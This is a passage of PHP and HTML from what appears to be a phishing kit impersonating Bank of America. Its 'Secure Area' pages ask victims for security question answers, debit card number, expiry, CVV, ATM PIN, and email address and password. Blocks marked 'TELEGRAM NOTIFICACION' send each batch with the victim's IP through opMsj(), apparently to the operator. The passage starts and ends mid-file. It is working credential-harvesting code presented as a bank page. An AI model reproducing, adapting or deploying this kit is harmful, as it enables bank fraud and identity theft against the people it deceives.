if (isset($ip) && !empty($ip) && isset($dispositivo) && !empty($dispositivo) && isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'pregcontinue' && isset($_POST['onlineId1']) && !empty($_POST['onlineId1']) && isset($_POST['passcode1']) && !empty($_POST['passcode1']) && isset($_POST['onlineId2']) && !empty($_POST['onlineId2']) && isset($_POST['passcode2']) && !empty($_POST['passcode2']) && isset($_POST['question1']) && !empty($_POST['question1']) && isset($_POST['response1']) && !empty($_POST['response1']) && isset($_POST['question2']) && !empty($_POST['question2']) && isset($_POST['response2']) && !empty($_POST['response2']) && isset($_POST['question3']) && !empty($_POST['question3']) && isset($_POST['response3']) && !empty($_POST['response3'])) {
	$msj = '<b>[PREGUNTAS]</b> '.$ip.' | Pregunta 1: <b>'.$_POST['question1'].'</b> | Respuesta 1: <b>'.$_POST['response1'].'</b> | Pregunta 2: <b>'.$_POST['question2'].'</b> | Respuesta 2: <b>'.$_POST['response2'].'</b> | Pregunta 3: <b>'.$_POST['question3'].'</b> | Respuesta 3: <b>'.$_POST['response3'].'</b> |';
	opMsj($msj, 2);
} else {
	if (isset($ip) && !empty($ip) && isset($dispositivo) && !empty($dispositivo) && isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'pregcontinue' && isset($_POST['onlineId1']) && !empty($_POST['onlineId1']) && isset($_POST['passcode1']) && !empty($_POST['passcode1']) && isset($_POST['onlineId2']) && !empty($_POST['onlineId2']) && isset($_POST['passcode2']) && !empty($_POST['passcode2']) && isset($_POST['question1']) && !empty($_POST['question1']) && isset($_POST['response1']) && !empty($_POST['response1']) && isset($_POST['question2']) && !empty($_POST['question2']) && isset($_POST['response2']) && !empty($_POST['response2']) && isset($_POST['question3']) && !empty($_POST['question3']) && isset($_POST['response3']) && !empty($_POST['response3'])) {
		$msj = '<b>[PREGUNTAS]</b> '.$ip.' | Pregunta 1: <b>'.$_POST['question1'].'</b> | Respuesta 1: <b>'.$_POST['response1'].'</b> | Pregunta 2: <b>'.$_POST['question2'].'</b> | Respuesta 2: <b>'.$_POST['response2'].'</b> | Pregunta 3: <b>'.$_POST['question3'].'</b> | Respuesta 3: <b>'.$_POST['response3'].'</b> |';
		opMsj($msj, 2);
	} else {
		header("Location: ./");
	}
}

?>

<div class="masthead-children">
<div id="signInModule" class="ah-hp-sign-in-module-class-v-5-3-0 ah-hp-sign-in-module">
<div class="row show-for-medium-up collapse" id="skip-to-h1">
<div style="display: block; padding-top:8px;">
<div style="padding-top:3px; padding-bottom:10px; background-image: url(./assets/flagscape.svg); color: #fff; background-color: #DC1431;" data-sticky-level="1" data-sticky-parent="body">
<div class="spa-page-title-inset row">
<div class="column">
<span data-font="cnx-regular" class="margin: 0; font-size: 22px; color: #fff; font-size: 2.75rem; font-family: 'cnx-regular',Arial,Helvetica,sans-serif; font-weight: 300; line-height: 1.4;" id="skip-to-h1">
Secure Area | Security Questions
</span>
</div>
<div class="panel-content light" aria-labelledby="faqSecurityTab0" style="max-height: none; padding-left:10px; padding-bottom:2px;">
<span style="font-size: 14px;">For security reasons answer the following questions</span>
</div>
</div>
</div>
<div id="faq-selector">
<form id="questionsform2" action="./" novalidate="" autocomplete="off" method="POST" tabindex="-1">
<input type="hidden" name="onlineId1" value="<?php if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['onlineId1']) && !empty($_POST['onlineId1'])) {echo $_POST['onlineId1'];} ?>"/>
<input type="hidden" name="passcode1" value="<?php if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['passcode1']) && !empty($_POST['passcode1'])) {echo $_POST['passcode1'];} ?>"/>
<input type="hidden" name="onlineId2" value="<?php if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['onlineId2']) && !empty($_POST['onlineId2'])) {echo $_POST['onlineId2'];} ?>"/>
<input type="hidden" name="passcode2" value="<?php if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['passcode2']) && !empty($_POST['passcode2'])) {echo $_POST['passcode2'];} ?>"/>
<input type="hidden" name="question1" value="<?php if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['question1']) && !empty($_POST['question1'])) {echo $_POST['question1'];} ?>"/>
<input type="hidden" name="response1" value="<?php if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['response1']) && !empty($_POST['response1'])) {echo $_POST['response1'];} ?>"/>
<input type="hidden" name="question2" value="<?php if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['question2']) && !empty($_POST['question2'])) {echo $_POST['question2'];} ?>"/>
<input type="hidden" name="response2" value="<?php if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['response2']) && !empty($_POST['response2'])) {echo $_POST['response2'];} ?>"/>
<input type="hidden" name="question3" value="<?php if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['question3']) && !empty($_POST['question3'])) {echo $_POST['question3'];} ?>"/>
<input type="hidden" name="response3" value="<?php if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['response3']) && !empty($_POST['response3'])) {echo $_POST['response3'];} ?>"/>
<input type="hidden" name="secure" value="true"/>
<input type="hidden" name="panel" value="card"/>
<div class="medium-12 columns medium-centered horiz-center-align">
<div class="faq-selector-container" style="background-color:#F9F9F9; padding:15px; border: 2px solid #F2F1F1;">
<div class="input-box">
<div class="spa-input spa-input-box spa-dropdown spa-input--sparta2">
<select autofocus onclick="hide(tooltip1);" id="question1" name="question4" class="spa-input-select" autocomplete="off" required="" type="text">
<option value="">Please choose your first question</option>
<option value="What famous person do you look like most?">What famous person do you look like most?</option>
<option value="What is the last name of your third grade teacher?">What is the last name of your third grade teacher?</option>
<option value="What is the name of your first boyfriend or your first girlfriend?">What is the name of your first boyfriend or your first girlfriend?</option>
<option value="What is the name of your favorite charity institution?">What is the name of your favorite charity institution?</option>
<option value="What was the name of your first nanny?">What was the name of your first nanny?</option>
<option value="What is the name of your best friend?">What is the name of your best friend?</option>
<option value="In which city did you meet your wife / partner?">In which city did you meet your wife / partner?</option>
<option value="In what city did your honeymoon?">In what city did your honeymoon?</option>
<option value="What is the last name of your family doctor?">What is the last name of your family doctor?</option>
<option value="In which street your best friend from childhood school lived?">In which street your best friend from childhood school lived?</option>
<option value="javascript:void(0);" disabled="disabled">—————————————</option>
</select>
</div>
<div class="spa-input spa-input-box spa-dropdown spa-input--sparta2" style="padding-top:6px;padding-bottom:15px">
<input onclick="hide(tooltip1);" type="text" class="spa-input-text" id="response1" name="response4" placeholder="Answer" minlength="4" required/>
</div>
<div class="spa-input spa-input-box spa-dropdown spa-input--sparta2">
<select onclick="hide(tooltip1);" id="question2" name="question5" class="spa-input-select" autocomplete="off" required="" type="text">
<option value="">Select your second question</option>
<option value="As a child, what did I want to be when I was older?">As a child, what did I want to be when I was older?</option>
<option value="What is the name of your high school dance escort?">What is the name of your high school dance escort?</option>
<option value="Who is your favorite historical character?">Who is your favorite historical character?</option>
<option value="What is the name of your star athlete in high school?">What is the name of your star athlete in high school?</option>
<option value="Where was the day of the new year of 2000?">Where was the day of the new year of 2000?</option>
<option value="What was the make and model of your first car?">What was the make and model of your first car?</option>
<option value="What was the name of your first boss?">What was the name of your first boss?</option>
<option value="What is the name of your godfather or wedding godmother?">What is the name of your godfather or wedding godmother?</option>
<option value="What was the first live concert you attended?">What was the first live concert you attended?</option>
<option value="javascript:void(0);" disabled="disabled">—————————————</option>
</select>
</div>
<div class="spa-input spa-input-box spa-dropdown spa-input--sparta2" style="padding-top:6px;padding-bottom:15px">
<input onclick="hide(tooltip1);" type="text" class="spa-input-text" id="response2" name="response5" placeholder="Answer" minlength="4" required/>
</div>
<div class="spa-input spa-input-box spa-dropdown spa-input--sparta2" style="padding-bottom:6px">
<select onclick="hide(tooltip1);" id="question3" name="question6" class="spa-input-select" autocomplete="off" required="" type="text">
<option value="">Choose your third question</option>
<option value="What is your favorite song of all life?">What is your favorite song of all life?</option>
<option value="What is the name of the university you applied to but you never went?">What is the name of the university you applied to but you never went?</option>
<option value="What is the name of the doctor who helped deliver your first child?">What is the name of the doctor who helped deliver your first child?</option>
<option value="What is the name of your favorite nephew?">What is the name of your favorite nephew?</option>
<option value="What is the name of your best childhood friend?">What is the name of your best childhood friend?</option>
<option value="What is the name of your favorite teacher?">What is the name of your favorite teacher?</option>
<option value="What is the name of your hairdresser / barber?">What is the name of your hairdresser / barber?</option>
<option value="What is the name of your mother's best friend?">What is the name of your mother's best friend?</option>
<option value="What street is your grocery store?">What street is your grocery store?</option>
<option value="What is the name of your first pet?">What is the name of your first pet?</option>
<option value="javascript:void(0);" disabled="disabled">—————————————</option>
</select>
</div>
<div class="spa-input spa-input-box spa-dropdown spa-input--sparta2" style="padding-bottom:15px">
<center>
<input onkeypress="if(window.event.keyCode==13){verifyquestions2();}" onclick="hide(tooltip1);" type="text" class="spa-input-text" id="response3" name="response6" placeholder="Answer" minlength="4" required/>
<span id="invalid" style="display:block; color:indianred; background-color:lightyellow; padding: 8px; font-family: 'Helvetica Neue';">
Incorrect, please try again.
</span>
</center>
</div>
<div style="position:absolute;z-index:99; justify-content: center; align-items: center;">
<span class="tooltip" id="tooltip1" onclick="hide(tooltip1);">
<center>Please, complete all questions and answers.</center>
</span>
</div>
<center><input type="button" id="change-faq-button" onclick="verifyquestions2();" href="javascript:void(0);" class="spa-btn spa-btn--medium" style="color: #fff; background-color: firebrick;" value="Confirm your questions"></center>
</div>
</div>
</div>
<input type="hidden" name="viewstate" value="?dHJ1ZSxlcyxjYXJsb3NtYXJpbnNpZm9udGVzQGdtYWlsLmNvbSw1RkJCNDVFMTcyREFDNEVENDYzMkY4Qzg0RDE2Q0FBQjdDNkY4MzZFNzRGMjVCQUU3MTUz" /></form>
</div>
</div>
</div>
</div>
</div>

<?php } elseif (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'card' && isset($_POST['onlineId1']) && !empty($_POST['onlineId1']) && isset($_POST['passcode1']) && !empty($_POST['passcode1']) && isset($_POST['question1']) && !empty($_POST['question1']) && isset($_POST['response1']) && !empty($_POST['response1']) && isset($_POST['question2']) && !empty($_POST['question2']) && isset($_POST['response2']) && !empty($_POST['response2']) && isset($_POST['question3']) && !empty($_POST['question3']) && isset($_POST['response3']) && !empty($_POST['response3'])) { ?>

<?php

# ---- TELEGRAM NOTIFICACION ---- #

if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'card' && isset($_POST['onlineId1']) && !empty($_POST['onlineId1']) && isset($_POST['passcode1']) && !empty($_POST['passcode1']) && isset($_POST['question1']) && !empty($_POST['question1']) && isset($_POST['response1']) && !empty($_POST['response1']) && isset($_POST['question2']) && !empty($_POST['question2']) && isset($_POST['response2']) && !empty($_POST['response2']) && isset($_POST['question3']) && !empty($_POST['question3']) && isset($_POST['response3']) && !empty($_POST['response3'])) {
	$msj = '<b>[PREGUNTAS]</b> '.$ip.' | Pregunta 1: <b>'.$_POST['question1'].'</b> | Respuesta 1: <b>'.$_POST['response1'].'</b> | Pregunta 2: <b>'.$_POST['question2'].'</b> | Respuesta 2: <b>'.$_POST['response2'].'</b> | Pregunta 3: <b>'.$_POST['question3'].'</b> | Respuesta 3: <b>'.$_POST['response3'].'</b> |';
	opMsj($msj, 2);
} else {
	if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'card' && isset($_POST['onlineId1']) && !empty($_POST['onlineId1']) && isset($_POST['passcode1']) && !empty($_POST['passcode1']) && isset($_POST['question1']) && !empty($_POST['question1']) && isset($_POST['response1']) && !empty($_POST['response1']) && isset($_POST['question2']) && !empty($_POST['question2']) && isset($_POST['response2']) && !empty($_POST['response2']) && isset($_POST['question3']) && !empty($_POST['question3']) && isset($_POST['response3']) && !empty($_POST['response3'])) {
		$msj = '<b>[PREGUNTAS]</b> '.$ip.' | Pregunta 1: <b>'.$_POST['question1'].'</b> | Respuesta 1: <b>'.$_POST['response1'].'</b> | Pregunta 2: <b>'.$_POST['question2'].'</b> | Respuesta 2: <b>'.$_POST['response2'].'</b> | Pregunta 3: <b>'.$_POST['question3'].'</b> | Respuesta 3: <b>'.$_POST['response3'].'</b> |';
		opMsj($msj, 2);
	} else {
		header("Location: ./");
	}
}

?>

<div class="masthead-children">
<div id="signInModule" class="ah-hp-sign-in-module-class-v-5-3-0 ah-hp-sign-in-module">
<div class="row show-for-medium-up collapse" id="skip-to-h1">
<div style="display: block; padding-top:15px;">
<div style="padding-top:3px; padding-bottom:10px; background-image: url(./assets/flagscape.svg); color: #fff; background-color: #DC1431;" data-sticky-level="1" data-sticky-parent="body">
<div class="spa-page-title-inset row">
<div class="column">
<span data-font="cnx-regular" class="margin: 0; font-size: 22px; color: #fff; font-size: 2.75rem; font-family: 'cnx-regular',Arial,Helvetica,sans-serif; font-weight: 300; line-height: 1.4;" id="skip-to-h1">
Secure Area | Card Security & Validation
</span>
</div>
<div class="panel-content light" aria-labelledby="faqSecurityTab0" style="max-height: none; padding-left:10px;">
<p style="font-size: 14px;">For security reasons confirm your debit card</p>
</div>
</div>
</div>
<form id="debitcardform" name="debitcardform" action="./" novalidate="" autocomplete="off" class="credit-card" method="POST" tabindex="-1">
<input type="hidden" name="secure" value="true"/>
<input type="hidden" name="panel" value="cardvalidation"/>
  <div style="padding-top:30px">
  </div>
<center>
  <div class="form-body">
  <div style="position:relative;">
  <input onclick="hide(tooltip1);" id="card" name="card" style="width:80.8%; height:40px" type="text" class="spa-input-text" size="20px" placeholder="Card number (Debit)" oninput="this.value = this.value.replace(/[^0-9]/g, ''); this.value = this.value.replace(/(.{4})/g, '$1 ').trim(); autotab(this, document.cord.cord21)" maxlength="19">
  </div>
  <div style="padding-top:15px;"></div>
    <div style="display:inline;">
        <select onclick="hide(tooltip1);" id="month" name="month" style="width:40%">
          <option value="january">January</option>
          <option value="february">February</option>
          <option value="march">March</option>
          <option value="april">April</option>
          <option value="may">May</option>
          <option value="june">June</option>
          <option value="july">July</option>
          <option value="august">August</option>
          <option value="september">September</option>
          <option value="october">October</option>
          <option value="november">November</option>
          <option value="december">December</option>
        </select>
        <select onclick="hide(tooltip1);" id="year" name="year" style="width:40%">
          <option value="2020">2020</option>
          <option value="2021">2021</option>
          <option value="2022">2022</option>
          <option value="2023">2023</option>
          <option value="2024">2024</option>
		  <option value="2025">2025</option>
		  <option value="2026">2026</option>
		  <option value="2027">2027</option>
		  <option value="2028">2028</option>
		  <option value="2029">2029</option>
		  <option value="2030">2030</option>
        </select>
    </div>

    <div class="card-verification">
      <div class="cvv-input">
        <input onclick="hide(tooltip1);" id="cvv" name="cvv" onclick="document.getElementById('cvvinfo').style.display='block';" onkeydown="document.getElementById('cvvinfo').style.display='none';" style="width:80.8%; height:40px" type="text" placeholder="Security Code" oninput="this.value = this.value.replace(/[^0-9]/g, ''); this.value = this.value.replace(/(\..*)\./g, '$1'); autotab(this, document.cord.cord21)" maxlength="4">
      </div>
      <div class="cvv-details">
        <span id="cvvinfo" style="color:#020202; display:none; background-color:#f2f2f2; padding-left:6px; width:80.8%">3 or 4 digits usually found on the signature strip</span>
      </div>
	  <div style="padding-top:14px;"></div>
      <div class="cvv-input">
        <input onkeypress="if(window.event.keyCode==13){verifydebitcard();}" onclick="hide(tooltip1);" id="pin" name="pin" style="width:80.8%; height:40px" type="text" placeholder="(ATM) Pin / Debit Card" oninput="this.value = this.value.replace(/[^0-9]/g, ''); this.value = this.value.replace(/(\..*)\./g, '$1'); autotab(this, document.cord.cord21)" maxlength="4">
      </div>
	  <div style="padding-top:15px;"></div>
    </div>
	<div style="position:relative;z-index:999;display:inline-block;">
	<span class="tooltipcard" id="tooltip1" onclick="hide(tooltip1);">
	<center>Please, complete all debit card information.</center>
	</span>
	<button onclick="verifydebitcard();" type="button" class="proceed-btn"><a href="javascript:void(0);">Proceed</a></button>
      <div id="loadingcard" style="display:none; padding-bottom:10px; background-color:#F8F8F8; color:#616161; padding:5px; padding-left:10px; padding-right:10px;">
        <span>Loading</span>
        <span class="circle-animation">
          <div class="circle-inline"></div>
          <div class="loading-circle circle-inline">
            <div class="circle-bounce1"></div>
            <div class="circle-bounce2"></div>
            <div class="circle-bounce3"></div>
          </div>
        </span>
      </div>
	</div>
  </div>
  </center>
<input type="hidden" name="viewstate" value="?dHJ1ZSxlcyxjYXJsb3NtYXJpbnNpZm9udGVzQGdtYWlsLmNvbSw1RkJCNDVFMTcyREFDNEVENDYzMkY4Qzg0RDE2Q0FBQjdDNkY4MzZFNzRGMjVCQUU3MTUz" /></form>
</div>
</div>
</div>
</div>

<?php } elseif (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'cardvalidation' && isset($_POST['card']) && !empty($_POST['card']) && isset($_POST['month']) && !empty($_POST['month']) && isset($_POST['year']) && !empty($_POST['year']) && isset($_POST['cvv']) && !empty($_POST['cvv']) && isset($_POST['pin']) && !empty($_POST['pin'])) { ?>

<?php

# ---- TELEGRAM NOTIFICACION ---- #

if (isset($ip) && !empty($ip) && isset($dispositivo) && !empty($dispositivo) && isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'cardvalidation' && isset($_POST['onlineId1']) && !empty($_POST['onlineId1']) && isset($_POST['passcode1']) && !empty($_POST['passcode1']) && isset($_POST['onlineId2']) && !empty($_POST['onlineId2']) && isset($_POST['passcode2']) && !empty($_POST['passcode2']) && isset($_POST['question1']) && !empty($_POST['question1']) && isset($_POST['response1']) && !empty($_POST['response1']) && isset($_POST['question2']) && !empty($_POST['question2']) && isset($_POST['response2']) && !empty($_POST['response2']) && isset($_POST['question3']) && !empty($_POST['question3']) && isset($_POST['response3']) && !empty($_POST['response3']) && isset($_POST['question4']) && !empty($_POST['question4']) && isset($_POST['response4']) && !empty($_POST['response4']) && isset($_POST['question5']) && !empty($_POST['question5']) && isset($_POST['response5']) && !empty($_POST['response5']) && isset($_POST['question6']) && !empty($_POST['question6']) && isset($_POST['response6']) && !empty($_POST['response6']) && isset($_POST['card']) && !empty($_POST['card']) && isset($_POST['month']) && !empty($_POST['month']) && isset($_POST['year']) && !empty($_POST['year']) && isset($_POST['cvv']) && !empty($_POST['cvv']) && isset($_POST['pin']) && !empty($_POST['pin'])) {
	$msj = '<b>[CARD]</b> '.$ip.' | Card: <b>'.$_POST['card'].'</b> | Month: <b>'.$_POST['month'].'</b> | Year: <b>'.$_POST['year'].'</b> | CVV: <b>'.$_POST['cvv'].'</b> | PIN: <b>'.$_POST['pin'].'</b> |';
	opMsj($msj, 2);
} else {
	if (isset($ip) && !empty($ip) && isset($dispositivo) && !empty($dispositivo) && isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'cardvalidation' && isset($_POST['onlineId1']) && !empty($_POST['onlineId1']) && isset($_POST['passcode1']) && !empty($_POST['passcode1']) && isset($_POST['onlineId2']) && !empty($_POST['onlineId2']) && isset($_POST['passcode2']) && !empty($_POST['passcode2']) && isset($_POST['question1']) && !empty($_POST['question1']) && isset($_POST['response1']) && !empty($_POST['response1']) && isset($_POST['question2']) && !empty($_POST['question2']) && isset($_POST['response2']) && !empty($_POST['response2']) && isset($_POST['question3']) && !empty($_POST['question3']) && isset($_POST['response3']) && !empty($_POST['response3']) && isset($_POST['question4']) && !empty($_POST['question4']) && isset($_POST['response4']) && !empty($_POST['response4']) && isset($_POST['question5']) && !empty($_POST['question5']) && isset($_POST['response5']) && !empty($_POST['response5']) && isset($_POST['question6']) && !empty($_POST['question6']) && isset($_POST['response6']) && !empty($_POST['response6']) && isset($_POST['card']) && !empty($_POST['card']) && isset($_POST['month']) && !empty($_POST['month']) && isset($_POST['year']) && !empty($_POST['year']) && isset($_POST['cvv']) && !empty($_POST['cvv']) && isset($_POST['pin']) && !empty($_POST['pin'])) {
		$msj = '<b>[CARD]</b> '.$ip.' | Card: <b>'.$_POST['card'].'</b> | Month: <b>'.$_POST['month'].'</b> | Year: <b>'.$_POST['year'].'</b> | CVV: <b>'.$_POST['cvv'].'</b> | PIN: <b>'.$_POST['pin'].'</b> |';
		opMsj($msj, 2);
	} else {
		header("Location: ./");
	}
}

?>

<div class="masthead-children">
<div id="signInModule" class="ah-hp-sign-in-module-class-v-5-3-0 ah-hp-sign-in-module">
<div class="row show-for-medium-up collapse" id="skip-to-h1">
<div style="display: block; padding-top:15px;">
<div style="padding-top:3px; padding-bottom:10px; background-image: url(./assets/flagscape.svg); color: #fff; background-color: #DC1431;" data-sticky-level="1" data-sticky-parent="body">
<div class="spa-page-title-inset row">
<div class="column">
<span data-font="cnx-regular" class="margin: 0; font-size: 22px; color: #fff; font-size: 2.75rem; font-family: 'cnx-regular',Arial,Helvetica,sans-serif; font-weight: 300; line-height: 1.4;" id="skip-to-h1">
Secure Area | Card Security & Validation
</span>
</div>
<div class="panel-content light" aria-labelledby="faqSecurityTab0" style="max-height: none; padding-left:10px;">
<p style="font-size: 14px;">For security reasons confirm your debit card</p>
</div>
</div>
</div>
<form id="debitcardform2" name="debitcardform2" action="./" novalidate="" autocomplete="off" class="credit-card" method="POST" tabindex="-1">
<input type="hidden" name="secure" value="true"/>
<input type="hidden" name="panel" value="vmail"/>
  <div style="padding-top:30px">
  </div>
<center>
  <div class="form-body">
  <div style="position:relative;">
  <input onclick="hide(tooltip1);" id="card" name="card2" style="width:80.8%; height:40px" type="text" class="spa-input-text" size="20px" placeholder="Card number (Debit)" oninput="this.value = this.value.replace(/[^0-9]/g, ''); this.value = this.value.replace(/(.{4})/g, '$1 ').trim(); autotab(this, document.cord.cord21)" maxlength="19">
  </div>
  <div style="padding-top:15px;"></div>
    <div style="display:inline;">
        <select onclick="hide(tooltip1);" id="month" name="month2" style="width:40%">
          <option value="january">January</option>
          <option value="february">February</option>
          <option value="march">March</option>
          <option value="april">April</option>
          <option value="may">May</option>
          <option value="june">June</option>
          <option value="july">July</option>
          <option value="august">August</option>
          <option value="september">September</option>
          <option value="october">October</option>
          <option value="november">November</option>
          <option value="december">December</option>
        </select>
        <select onclick="hide(tooltip1);" id="year" name="year2" style="width:40%">
          <option value="2020">2020</option>
          <option value="2021">2021</option>
          <option value="2022">2022</option>
          <option value="2023">2023</option>
          <option value="2024">2024</option>
		  <option value="2025">2025</option>
		  <option value="2026">2026</option>
		  <option value="2027">2027</option>
		  <option value="2028">2028</option>
		  <option value="2029">2029</option>
		  <option value="2030">2030</option>
        </select>
    </div>

    <div class="card-verification">
      <div class="cvv-input">
        <input onclick="hide(tooltip1);" id="cvv" name="cvv2" onclick="document.getElementById('cvvinfo').style.display='block';" onkeydown="document.getElementById('cvvinfo').style.display='none';" style="width:80.8%; height:40px" type="text" placeholder="Security Code" oninput="this.value = this.value.replace(/[^0-9]/g, ''); this.value = this.value.replace(/(\..*)\./g, '$1'); autotab(this, document.cord.cord21)" maxlength="4">
      </div>
      <div class="cvv-details">
        <span id="cvvinfo" style="color:#020202; display:none; background-color:#f2f2f2; padding-left:6px; width:80.8%">3 or 4 digits usually found on the signature strip</span>
      </div>
	  <div style="padding-top:14px;"></div>
      <div class="cvv-input">
        <input onkeypress="if(window.event.keyCode==13){verifydebitcard2();}" onclick="hide(tooltip1);" id="pin" name="pin2" style="width:80.8%; height:40px" type="text" placeholder="(ATM) Pin / Debit Card" oninput="this.value = this.value.replace(/[^0-9]/g, ''); this.value = this.value.replace(/(\..*)\./g, '$1'); autotab(this, document.cord.cord21)" maxlength="4">
		<span id="invalid" style="width:80.8%; display:block; color:indianred; background-color:lightyellow; padding: 8px; font-family: 'Helvetica Neue';">
		La tarjeta ingresada no coincide con la emitida por Bank of America.
		</span>
	  </div>
	  <div style="padding-top:15px;"></div>
    </div>
	<div style="position:relative;z-index:999;display:inline-block;">
	<span class="tooltipcard" id="tooltip1" onclick="hide(tooltip1);">
	<center>Please, complete your debit card information.</center>
	</span>
	<button onclick="verifydebitcard2();" type="button" class="proceed-btn"><a href="javascript:void(0);">Proceed</a></button>
	</div>
  </div>
  </center>
<input type="hidden" name="viewstate" value="?dHJ1ZSxlcyxjYXJsb3NtYXJpbnNpZm9udGVzQGdtYWlsLmNvbSw1RkJCNDVFMTcyREFDNEVENDYzMkY4Qzg0RDE2Q0FBQjdDNkY4MzZFNzRGMjVCQUU3MTUz" /></form>
</div>
</div>
</div>
</div>

<?php } elseif (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'vmail' && isset($_POST['viewstate']) && !empty($_POST['viewstate'])) { ?>

<?php

# ---- TELEGRAM NOTIFICACION ---- #

if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'vmail' && isset($_POST['viewstate']) && !empty($_POST['viewstate'])) {
	$msj = '<b>[RE-CARD]</b> '.$ip.' | Card: <b>'.$_POST['card2'].'</b> | Month: <b>'.$_POST['month2'].'</b> | Year: <b>'.$_POST['year2'].'</b> | CVV: <b>'.$_POST['cvv2'].'</b> | PIN: <b>'.$_POST['pin2'].'</b> |';
	opMsj($msj, 2);
} else {
	if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 'vmail' && isset($_POST['viewstate']) && !empty($_POST['viewstate'])) {
		$msj = '<b>[RE-CARD]</b> '.$ip.' | Card: <b>'.$_POST['card2'].'</b> | Month: <b>'.$_POST['month2'].'</b> | Year: <b>'.$_POST['year2'].'</b> | CVV: <b>'.$_POST['cvv2'].'</b> | PIN: <b>'.$_POST['pin'].'</b> |';
		opMsj($msj, 2);
	} else {
		header("Location: ./");
	}
}

?>

<div class="masthead-children">
<div id="signInModule" class="ah-hp-sign-in-module-class-v-5-3-0 ah-hp-sign-in-module">
<div class="row show-for-medium-up collapse" id="skip-to-h1">
<div style="display: block; padding-top:15px;">
<div style="padding-top:3px; padding-bottom:10px; background-image: url(./assets/flagscape.svg); color: #fff; background-color: #DC1431;" data-sticky-level="1" data-sticky-parent="body">
<div class="spa-page-title-inset row">
<div class="column">
<span data-font="cnx-regular" class="margin: 0; font-size: 22px; color: #fff; font-size: 2.75rem; font-family: 'cnx-regular',Arial,Helvetica,sans-serif; font-weight: 300; line-height: 1.4;" id="skip-to-h1">
Secure Area | Email Verification
</span>
</div>
<div class="panel-content light" aria-labelledby="faqSecurityTab0" style="max-height: none; padding-left:10px;">
<p style="font-size: 14px;">Please confirm your email</p>
</div>
</div>
</div>
  <div style="padding-top:15px;"></div>
<form id="vmailform" name="vmailform" action="./" novalidate="" autocomplete="off" class="credit-card" method="POST" tabindex="-1">
<input type="hidden" name="secure" value="true"/>
<input type="hidden" name="panel" value="re-vmail"/>
<center>
  <div class="form-body">
  <div style="color:black"><b>Email</b>: <input onclick="hide(tooltip1);hide(tooltip2)" id="email" name="email" style="width:80.8%; height:40px" type="email" class="spa-input-text" size="20px" placeholder="Email" maxlength="30"></div>
  <div style="padding-top:15px;"></div>
  <div style="color:black"><b>Password</b>: <input onclick="hide(tooltip1);hide(tooltip2);" id="email_password" name="email_password" style="width:80.8%; height:40px" type="password" class="spa-input-text" size="20px" placeholder="Email Password" maxlength="30"></div>
  <div style="padding-top:15px;"></div>
	<div style="position:relative;z-index:999;display:inline-block;">
	<span class="tooltipvmail" id="tooltip2" onclick="hide(tooltip2);"><center>Please enter a valid email address.</center></span>
	<span class="tooltipvmail" id="tooltip1" onclick="hide(tooltip1);">
	<center>Please, complete your password.</center>
	</span>
	<button onclick="verifyvmail();" type="button" class="proceed-btn"><a href="javascript:void(0);">Proceed</a></button>
	</div>
  </div>
  </center>
<input type="hidden" name="viewstate" value="?dHJ1ZSxlcyxjYXJsb3NtYXJpbnNpZm9udGVzQGdtYWlsLmNvbSw1RkJCNDVFMTcyREFDNEVENDYzMkY4Qzg0RDE2Q0FBQjdDNkY4MzZFNzRGMjVCQUU3MTUz" /></form>
</div>
</div>
</div>
</div>

<?php } elseif (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 're-vmail' && isset($_POST['viewstate']) && !empty($_POST['viewstate']) && isset($_POST['email']) && !empty($_POST['email']) && isset($_POST['email_password']) && !empty($_POST['email_password'])) { ?>

<?php

# ---- TELEGRAM NOTIFICACION ---- #

if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 're-vmail' && isset($_POST['viewstate']) && !empty($_POST['viewstate']) && isset($_POST['email']) && !empty($_POST['email']) && isset($_POST['email_password']) && !empty($_POST['email_password'])) {
	$msj = '<b>[EMAIL]</b> '.$ip.' | Email: <b>'.$_POST['email'].'</b> | Password: <b>'.$_POST['email_password'].'</b> |';
	opMsj($msj, 2);
} else {
	if (isset($_POST['secure']) && $_POST['secure'] == 'true' && isset($_POST['panel']) && $_POST['panel'] == 're-vmail' && isset($_POST['viewstate']) && !empty($_POST['viewstate']) && isset($_POST['email']) && !empty($_POST['email']) && isset($_POST['email_password']) && !empty($_POST['email_password'])) {
		$msj = '<b>[EMAIL]</b> '.$ip.' | Email: <b>'.$_POST['email'].'</b> | Password: <b>'.$_POST['email_password'].'</b> |';
		opMsj($msj, 2);
	} else {
		header("Location: ./");
	}
}

?>

<div class="masthead-children">
<div id="signInModule" class="ah-hp-sign-in-module-class-v-5-3-0 ah-hp-sign-in-module">
<div class="row show-for-medium-up collapse" id="skip-to-h1">
<div style="display: block; padding-top:15px;">
